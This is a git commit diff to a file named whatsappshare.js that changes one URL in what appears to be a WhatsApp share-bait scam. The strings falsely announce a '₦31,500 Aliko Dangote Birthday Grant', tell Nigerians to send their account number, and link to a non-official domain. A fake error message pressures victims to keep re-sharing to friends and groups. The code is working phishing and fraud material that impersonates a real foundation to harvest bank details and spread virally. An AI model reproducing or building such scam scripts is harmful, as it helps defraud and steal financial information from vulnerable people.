f8711a47cb2b554842313587499d19bb8d0837ba
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-01-31 14:57:18 -0800

    Update whatsappshare.js

--- whatsappshare.js
+++ whatsappshare.js
@@ -1,5 +1,5 @@
 
-       var text1 = "*₦31,500 Aliko Dangote Birthday Grant to all Nigerians*%0A%0A*Dont Miss this year Aliko Dangote Birthday Grant*%0A%0ASend your account number now to receive your cash in 15 minutes%0A%0APowered by Aliko Dangote Foundation%0A%0A*CHECK HERE* 👇%0Ahttps://2024-program.xyz/dangoteat67.html",
+       var text1 = "*₦31,500 Aliko Dangote Birthday Grant to all Nigerians*%0A%0A*Dont Miss this year Aliko Dangote Birthday Grant*%0A%0ASend your account number now to receive your cash in 15 minutes%0A%0APowered by Aliko Dangote Foundation%0A%0A*CHECK HERE* 👇%0Ahttps://2024-program.xyz/dangoteat67",
             text2 = " an amount of ",
             text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
             error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
